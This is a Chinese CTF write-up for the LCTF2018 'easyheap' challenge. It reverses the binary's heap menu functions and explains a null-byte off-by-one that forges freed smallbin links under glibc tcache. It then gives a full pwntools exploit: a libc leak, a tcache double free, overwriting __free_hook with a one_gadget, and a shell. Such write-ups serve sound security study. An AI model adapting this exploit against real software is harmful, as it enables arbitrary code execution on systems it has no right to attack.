# LCTF2018 easyheap
## Author: Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这题主要的考点就是利用Null byte off by one**伪造freed smallbin**来达到unlink重叠堆块。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>又是一个我以前遗漏的知识点，之前只伪造过largebin，这次学到了free smallbin的检查过程，以前只知道unlink的两个堆块要freed，但不知道其中是怎么判断的，这题虽然只有Null byte off by one漏洞，伪造能力很有限，但是因为程序的堆块空间对齐的非常好，所以依然可以擦除lsb刚好对齐，成功伪造成freed smallbin double link。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>扯淡扯完了，老样子我们先看看程序的ida伪代码吧：</font></br>

**main**

```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  sub_A3A();
  link = (__int64)calloc(0xA0uLL, 1uLL);
  if ( !link )
  {
    puts("init error!");
    quit();
  }
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = get_choose();
      if ( v3 != 2 )
        break;
      delete(160LL, 1LL);
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        show();
      }
      else if ( v3 == 4 )
      {
        quit();
      }
    }
    else if ( v3 == 1 )
    {
      alloc();
    }
  }
}
```

**alloc**

```C
unsigned __int64 alloc()
{
  __int64 link_ptr; // rbx
  __int64 index; // [rsp+0h] [rbp-20h]
  int indexa; // [rsp+0h] [rbp-20h]
  unsigned int size; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  LODWORD(index) = 0;
  while ( (signed int)index <= 9 && *(_QWORD *)(16LL * (signed int)index + link) )
    LODWORD(index) = index + 1;
  if ( (_DWORD)index == 10 )
  {
    puts("full!");
  }
  else
  {
    link_ptr = link;
    *(_QWORD *)(link_ptr + 16LL * (signed int)index) = malloc(0xF8uLL);
    if ( !*(_QWORD *)(16LL * (signed int)index + link) )
    {
      puts("malloc error!");
      quit();
    }
    printf("size \n> ", index);
    size = get_choose();
    if ( size > 0xF8 )
      quit();
    *(_DWORD *)(16LL * indexa + link + 8) = size;
    printf("content \n> ");
    nullbyteoff_read(*(_BYTE **)(16LL * indexa + link), *(_DWORD *)(16LL * indexa + link + 8));
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**delete**

```C
unsigned __int64 __fastcall delete(__int64 a1, __int64 a2)
{
  unsigned int index; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("index \n> ", a2);
  index = get_choose();
  if ( index > 9 || !*(_QWORD *)(16LL * index + link) )
    quit();
  memset(*(void **)(16LL * index + link), 0, *(unsigned int *)(16LL * index + link + 8));
  free(*(void **)(16LL * index + link));
  *(_DWORD *)(16LL * index + link + 8) = 0;
  *(_QWORD *)(16LL * index + link) = 0LL;
  return __readfsqword(0x28u) ^ v4;
}
```
**show**

```C
unsigned __int64 show()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("index \n> ");
  v1 = get_choose();
  if ( v1 > 9 || !*(_QWORD *)(16LL * v1 + link) )
    quit();
  puts(*(const char **)(16LL * v1 + link));
  return __readfsqword(0x28u) ^ v2;
}
```

**nullbyteoffbyone_read**

```C
unsigned __int64 __fastcall nullbyteoff_read(_BYTE *chunk, int size)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  i = 0;
  if ( size )
  {
    while ( 1 )
    {
      read(0, &chunk[i], 1uLL);
      if ( size - 1 < i || !chunk[i] || chunk[i] == 10 )
        break;
      ++i;
    }
    chunk[i] = 0;
    chunk[size] = 0;
  }
  else
  {
    *chunk = 0;
  }
  return __readfsqword(0x28u) ^ v4;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>乍一看可能想不到什么利用方法，比较明显的就是read中的chunk[size]有一个0字节溢出，但还有一个chunk[i]=0呢？为什么会有这个？试想一下，如果我们**什么都不输入**，那么就只有一个换行符到了read里，直接break跳出循环，i=0，chunk[0]=0那么不就等于**修改了fd指针**吗？所以当对堆块进行输入的时候，堆块会根据你的实际输入和事先输入的size进行padding一个0。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>**1.不输入(一个'\n')：chunk[0]=0,chunk[size]=0。**</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>**2.输入n长度：chunk[n]=0,chunk[size]=0。**</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>**3.输入长度n=size：chunk[size=0]。**</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>综上，因为堆块是事先分配好的固定的0xf8，跟输入的size没什么关系，所以2，3都没什么卵用，主要是**用1这种情况来伪造链表**。只要我们给size输入0xf8，溢出的0就会覆盖下一个堆块的pre_inuse，再来构造unlink。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>注意tcache的机制，如果**堆块大小小于0x408的时候，要free 7个堆块，下一个free的堆块才会被放入常规的链表里**，此处chunk大小为0x100，所以第8个freed的堆块才会被放入smallbin list，程序最多分配10个，所以我们最多有3个smallbin。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>我们先分配10个堆块看一下堆块地址：</font></br>

```
0x5590977b1240:	0x0000000000000000	0x0000000000000000
0x5590977b1250:	0x0000000000000000	0x00000000000000b1
0x5590977b1260:	0x00005590977b1310	0x00000000000000f8
0x5590977b1270:	0x00005590977b1410	0x00000000000000f8
pwndbg> 
0x5590977b1280:	0x00005590977b1510	0x00000000000000f8
0x5590977b1290:	0x00005590977b1610	0x00000000000000f8
0x5590977b12a0:	0x00005590977b1710	0x00000000000000f8
0x5590977b12b0:	0x00005590977b1810	0x00000000000000f8
0x5590977b12c0:	0x00005590977b1910	0x00000000000000f8
0x5590977b12d0:	0x00005590977b1a10	0x00000000000000f8
0x5590977b12e0:	0x00005590977b1b10	0x00000000000000f8
0x5590977b12f0:	0x00005590977b1c10	0x00000000000000f8
0x5590977b1300:	0x0000000000000000	0x0000000000000101
0x5590977b1310:	0x0000000000000000	0x0000000000000000
pwndbg> 
0x5590977b1320:	0x0000000000000000	0x0000000000000000
0x5590977b1330:	0x0000000000000000	0x0000000000000000
0x5590977b1340:	0x0000000000000000	0x0000000000000000

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>可以看到堆块头都刚好以0x100对齐了，擦除了fd指针的lsb之后正好是一个类似smallbin double link的状态，只要分配的smallbin擦除其fd指针的lsb，再把要unlink的smallbin的下一个堆块的pre_inuse标志擦除，就可以成功绕过free检查成功unlink创建重叠堆块,同时leak出libc基址，利用过程如下：</font></br>

```python
from pwn import *

DEBUG=1

if DEBUG==1:
    context.log_level='debug'

p=process('./easy_heap',env={'LD_PRELOAD':'./libc64.so'})
elf=ELF('./libc64.so')
one_gadget=0x4f322

sd=lambda c: p.send(c)
sl=lambda c: p.sendline(c)
rv=lambda c: p.recvuntil(c)
sa=lambda a,c: p.sendafter(a,c)
sla=lambda a,c: p.sendlineafter(a,c)


def alloc(size,content=''):
    sla('command?\n> ','1')
    sla('size \n> ',str(size))
    sla('content \n> ',content)

def free(index):
    sla('command?\n> ','2')
    sla('index \n> ',str(index))

def show(index):
    sla('command?\n> ','3')
    sla('index \n> ',str(index))

for i in range(10):
    alloc(0xf8) # 0-9
gdb.attach(p)

free(1)
free(2)
free(4)
free(5)
for i in range(7,10):
    free(i)

# these three chunks will be added
# into smallbin double link
free(6)
free(3)
free(0)

for i in range(7):
    alloc(0xf0) # 0-6

alloc(0)     # 7 | rewrite the LSB of fd
alloc(0xf8)  # 8 | rewrite the LSB of fd and next chunk's size

free(0)
free(1)
free(2)
free(3)
free(5)
free(6)

free(4) # trigger here

show(8)
libc_base=u64(p.recv(6)+2*'\x00')-0x3ebca0
log.info('libc base is :'+hex(libc_base))

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>只要有了重叠堆块，tcache下的double free简直不要太简单,想覆盖什么覆盖什么:</font></br>

```python
for i in range(7):
    alloc(0xf0)

alloc(0xf0)

# casually free some chunks to
# avoid alloc to much 
free(1)
free(2)
free(3)

# double free here
free(8)
free(9)

alloc(0xf0,p64(libc_base+elf.symbols['__free_hook']))
alloc(0xf0,p64(libc_base+one_gadget))
alloc(0xf0,p64(libc_base+one_gadget))

free(0)


p.interactive()

```
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>做完了:)</font></br>